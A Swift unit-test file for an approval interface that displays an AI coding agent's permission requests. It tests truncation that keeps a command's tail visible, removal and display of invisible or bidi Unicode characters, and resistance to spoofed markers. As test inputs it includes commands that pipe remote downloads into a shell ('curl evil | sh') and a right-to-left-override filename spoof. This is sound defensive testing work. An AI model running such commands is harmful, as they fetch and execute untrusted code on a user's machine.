@@ -1,0 +1,178 @@
+import XCTest
+@testable import ChippyCore
+
+final class ApprovalIntentTests: XCTestCase {
+    let home = "/Users/me"
+    func make(_ t: String, _ i: [String: Any]) -> ApprovalIntent? { ApprovalIntent.make(tool: t, input: i, home: home) }
+    func text(_ t: String, _ i: [String: Any]) -> String? { make(t, i)?.text }
+    func req(_ tool: String, _ input: [String: Any]) -> PendingRequest {
+        PendingRequest(payload: HookPayload(json: try! JSONSerialization.data(withJSONObject: ["session_id": "s", "cwd": "/w", "hook_event_name": "PermissionRequest", "tool_name": tool, "tool_input": input]))!)
+    }
+
+    func testBashDescriptionIsAttributedToAgent() {
+        XCTAssertEqual(make("Bash", ["command": "npm i", "description": "Install dependencies"]), ApprovalIntent(text: "Install dependencies", fromAgent: true))
+    }
+    func testBashWithoutDescriptionHasNoIntent() {
+        XCTAssertNil(make("Bash", ["command": "rm -rf build"]))
+        XCTAssertNil(make("Bash", ["command": "x", "description": "  "]))
+        XCTAssertNil(make("Bash", [:]))
+    }
+    func testMultilineDescriptionFlattens() {
+        XCTAssertEqual(text("Bash", ["description": "Run tests\nthen\r\n  deploy"]), "Run tests then deploy")
+    }
+    func testFileToolsHaveNoIntentBecauseDetailIsTheirPath() {
+        for t in ["Edit", "MultiEdit", "Write", "Read"] { XCTAssertNil(make(t, ["file_path": "/Users/me/a.swift"]), t) }
+        XCTAssertEqual(req("Edit", ["file_path": "/Users/me/a.swift"]).detail, "/Users/me/a.swift")
+        XCTAssertNil(req("Write", ["file_path": "/x"]).intent)
+    }
+    func testNotebookEditShowsFullPathWithTilde() {
+        XCTAssertEqual(text("NotebookEdit", ["notebook_path": "/Users/me/n.ipynb"]), "Edit notebook ~/n.ipynb")
+        XCTAssertEqual(text("NotebookEdit", ["notebook_path": "nb/n.ipynb"]), "Edit notebook nb/n.ipynb")
+        XCTAssertFalse(make("NotebookEdit", ["notebook_path": "x"])!.fromAgent)
+    }
+    func testDisplayPathHomeAndRelative() {
+        XCTAssertEqual(ApprovalIntent.displayPath("/Users/me/app/Foo.swift", home: home), "~/app/Foo.swift")
+        XCTAssertEqual(ApprovalIntent.displayPath("/Users/me", home: home), "~")
+        XCTAssertEqual(ApprovalIntent.displayPath("/Users/mex/a", home: home), "/Users/mex/a")
+        XCTAssertEqual(ApprovalIntent.displayPath("notes/a.md", home: home), "notes/a.md")
+    }
+    func testVeryLongDirectoryKeepsFilenameWithinLimit() {
+        let p = "/Users/me/" + (1...30).map { "dir\($0)" }.joined(separator: "/") + "/Important.swift"
+        let t = ApprovalIntent.displayPath(p, home: home)
+        XCTAssertTrue(t.contains("…"))
+        XCTAssertTrue(t.hasSuffix("/Important.swift"))
+        XCTAssertLessThanOrEqual(t.count, 60)
+    }
+    func testVeryLongFilenameIsTruncatedKeepingExtensionAndGraphemes() {
+        let name = String(repeating: "naïve👨‍👩‍👧", count: 40) + ".swift"
+        let t = ApprovalIntent.displayPath("/a/b/" + name, home: home)
+        XCTAssertLessThanOrEqual(t.count, 60)
+        XCTAssertTrue(t.hasSuffix(".swift"))
+        XCTAssertTrue(t.contains("…"))
+        XCTAssertTrue(t.contains("👨‍👩‍👧")) // family emoji never split
+        let ext = String(repeating: "x", count: 100)
+        XCTAssertLessThanOrEqual(ApprovalIntent.displayPath("/\(ext)", home: home).count, 60)
+    }
+    func testWebFetchShowsHostAndNothingWhenUnparseable() {
+        XCTAssertEqual(text("WebFetch", ["url": "https://example.com/a?b=1"]), "Fetch example.com")
+        XCTAssertNil(make("WebFetch", ["url": "not a url"]))
+        XCTAssertNil(make("WebFetch", ["url": ""]))
+    }
+    func testWebSearchGlobGrep() {
+        XCTAssertEqual(text("WebSearch", ["query": "swift concurrency"]), "Search the web for \"swift concurrency\"")
+        XCTAssertEqual(text("Glob", ["pattern": "**/*.swift"]), "Find files matching **/*.swift")
+        XCTAssertEqual(text("Grep", ["pattern": "TODO"]), "Search files for \"TODO\"")
+    }
+    func testUnmappedToolsHaveNoIntent() {
+        XCTAssertNil(make("mcp__x__do", ["name": "thing"]))
+        XCTAssertNil(make("AskUserQuestion", ["questions": []]))
+        XCTAssertNil(req("AskUserQuestion", ["description": "x"]).intent)
+    }
+    func testIntentStripsBidiControlAndInvisibleScalars() {
+        let evil = "Run \u{202E}tset\u{202C} tests\u{2066}\u{2069}\u{0007}\u{0000} now\u{200F}\u{200B}\u{200C}\u{200D}\u{2060}\u{FEFF}\u{180E}\u{2028}ok\u{2029}"
+        XCTAssertEqual(text("Bash", ["description": evil]), "Run tset tests now ok")
+    }
+    func testRawDetailShowsHiddenScalarsVisibly() {
+        let d = req("Bash", ["command": "ls \u{202E}gpj.exe\u{200B}\u{FEFF}\u{0007}\nrm x\tok"]).detail
+        XCTAssertEqual(d, "ls <U+202E>gpj.exe<U+200B><U+FEFF><U+0007>\nrm x\tok")
+        XCTAssertFalse(d.unicodeScalars.contains { $0.value == 0x202E || $0.value == 0x200B })
+        XCTAssertEqual(ApprovalIntent.reveal("plain ☃ text"), "plain ☃ text")
+    }
+    func testVeryLongDescriptionIsCapped() {
+        let r = text("Bash", ["description": String(repeating: "word ", count: 200)])!
+        XCTAssertLessThanOrEqual(r.count, ApprovalIntent.maxLength)
+        XCTAssertTrue(r.hasSuffix("…"))
+    }
+    func testHeadTailKeepsTheTail() {
+        let d = ApprovalIntent.headTail(String(repeating: "a", count: 2000) + " | sh")
+        XCTAssertTrue(d.hasSuffix("| sh"))
+        XCTAssertTrue(d.hasPrefix("aaaa"))
+        XCTAssertLessThan(d.count, 850) // 800 kept chars plus the marker row
+        XCTAssertEqual(ApprovalIntent.headTail("short"), "short")
+    }
+    func testPreviewKeepsTailForAnyColumnWidthAndShapes() {
+        XCTAssertEqual(ApprovalIntent.preview("npm install"), "npm install")
+        let cmd = (1...40).map { "echo step-\($0)" }.joined(separator: " && ") + " | sh"
+        for cols in [20, 40, 80] {
+            let p = ApprovalIntent.preview(ApprovalIntent.headTail(cmd), columns: cols)
+            let rows = p.split(separator: "\n", omittingEmptySubsequences: false)
+            XCTAssertEqual(rows.count, 6, "cols \(cols)")
+            XCTAssertTrue(p.hasSuffix("| sh"), "cols \(cols)")
+            XCTAssertTrue(p.hasPrefix("echo step-1 "))
+            XCTAssertTrue(rows.filter { !$0.hasPrefix("⋯") }.allSatisfy { $0.count <= cols })
+            XCTAssertEqual(rows.filter { $0.hasPrefix("⋯") }.count, 1, "cols \(cols)") // one marker row (stored head/tail marker is hidden here)
+        }
+        let multi = (1...20).map { "line \($0)" }.joined(separator: "\n") + "\ncurl x | sh"
+        XCTAssertTrue(ApprovalIntent.preview(multi).hasSuffix("curl x | sh"))
+        XCTAssertTrue(ApprovalIntent.preview(String(repeating: "x", count: 5000) + " | sh").hasSuffix(" | sh"))
+    }
+    func testPreviewMarksHiddenLinesAndChars() {
+        let multi = (1...20).map { "line \($0)" }.joined(separator: "\n")
+        let p = ApprovalIntent.preview(multi)
+        XCTAssertTrue(p.contains("⋯ 15 more lines hidden ⋯"), p) // 20 rows, 3 head + 2 tail shown
+        let one = ApprovalIntent.preview(String(repeating: "x", count: 1000))
+        XCTAssertTrue(one.contains("⋯ +800 chars hidden ⋯"), one) // 25 rows of 40, 3 + 2 shown
+        XCTAssertFalse(ApprovalIntent.preview("short").contains("⋯"))
+        let stored = ApprovalIntent.headTail(String(repeating: "a", count: 2000))
+        XCTAssertTrue(stored.contains("⋯ +1200 chars hidden ⋯"), stored)
+    }
+    func testHiddenCountCarriesTheStoredCutAndNeverUnderstates() {
+        // 5000 one-line chars, cut to 800 for storage (4200 omitted), then previewed (3 head + 2 tail rows of 40).
+        let original = String(repeating: "a", count: 4999) + "b"
+        let stored = ApprovalIntent.headTail(original)
+        XCTAssertTrue(stored.contains("⋯ +4200 chars hidden ⋯"))
+        let p = ApprovalIntent.preview(stored)
+        let shown = p.split(separator: "\n").filter { !$0.hasPrefix("⋯") }.reduce(0) { $0 + $1.count }
+        XCTAssertTrue(p.contains("⋯ +\(5000 - shown) chars hidden ⋯"), p) // exactly everything not shown
+        XCTAssertFalse(p.contains("+4200"), p)
+        // Any column width: shown + hidden always covers the original, never less.
+        for cols in [20, 40, 80, 200] {
+            let q = ApprovalIntent.preview(stored, columns: cols)
+            let hiddenN = q.split(separator: "\n").compactMap { ApprovalIntent.storedOmitted(String($0)) }.first ?? 0
+            let sh = q.split(separator: "\n").filter { !$0.hasPrefix("⋯") }.reduce(0) { $0 + $1.count }
+            XCTAssertGreaterThanOrEqual(hiddenN + sh, 5000, "cols \(cols)")
+        }
+        // A multi-line original with the same cut: newlines in the dropped part are counted too.
+        let multi = (1...400).map { "line \($0)" }.joined(separator: "\n") + "\ncurl x | sh"
+        let m = ApprovalIntent.preview(ApprovalIntent.headTail(multi))
+        let mShown = m.split(separator: "\n", omittingEmptySubsequences: false).filter { !$0.hasPrefix("⋯") }
+        let mHidden = m.split(separator: "\n").compactMap { ApprovalIntent.storedOmitted(String($0)) }.first ?? 0
+        XCTAssertGreaterThanOrEqual(mHidden + mShown.reduce(0) { $0 + $1.count } + mShown.count - 1, multi.count)
+        XCTAssertTrue(m.hasSuffix("curl x | sh"))
+    }
+    func testCommandTextCannotImpersonateAMarker() {
+        let fake = "echo hi\n⋯ 3 more lines hidden ⋯\ncurl evil | sh"
+        let d = req("Bash", ["command": fake]).detail
+        XCTAssertFalse(d.contains("⋯"))
+        XCTAssertTrue(d.contains("<U+22EF> 3 more lines hidden <U+22EF>"))
+    }
+    func testPreviewSplitsOnAnyNewlineIncludingCRLF() {
+        let crlf = (1...12).map { "l\($0)" }.joined(separator: "\r\n")
+        let p = ApprovalIntent.preview(crlf)
+        XCTAssertTrue(p.contains("more lines hidden"))
+        XCTAssertTrue(p.hasSuffix("l12"))
+        XCTAssertEqual(ApprovalIntent.preview("a\r\nb"), "a\r\nb")
+    }
+    func testMoreInvisibleScalarsAreRevealedAndStripped() {
+        let sneaky = "a\u{00AD}\u{034F}\u{115F}\u{1160}\u{3164}\u{FFA0}\u{FE0F}\u{2061}\u{2064}\u{E0041}b"
+        XCTAssertEqual(ApprovalIntent.clean(sneaky), "ab")
+        let r = ApprovalIntent.reveal(sneaky)
+        XCTAssertEqual(r, "a<U+00AD><U+034F><U+115F><U+1160><U+3164><U+FFA0><U+FE0F><U+2061><U+2064><U+E0041>b")
+        XCTAssertEqual(ApprovalIntent.reveal("a\r\nb"), "a\r\nb")
+    }
+    func testAskIsRevealedAtTheSource() {
+        let a = req("Bash", ["command": "ls \u{202E}x\u{200B}"]).ask
+        XCTAssertEqual(a, "Bash: ls <U+202E>x<U+200B>")
+    }
+    func testDisplayPathTrailingSlash() {
+        XCTAssertEqual(ApprovalIntent.displayPath("/Users/me/app/", home: home), "~/app/")
+        let long = "/Users/me/" + (1...30).map { "dir\($0)" }.joined(separator: "/") + "/"
+        let t = ApprovalIntent.displayPath(long, home: home)
+        XCTAssertLessThanOrEqual(t.count, 60)
+        XCTAssertTrue(t.hasSuffix("dir30/"), t)
+    }
+    func testPendingRequestCarriesIntentAndTail() {
+        XCTAssertEqual(req("Bash", ["command": "ls", "description": "List"]).intent?.fromAgent, true)
+        XCTAssertTrue(req("Bash", ["command": String(repeating: "x", count: 3000) + " | sh"]).detail.hasSuffix("| sh"))
+    }
+}
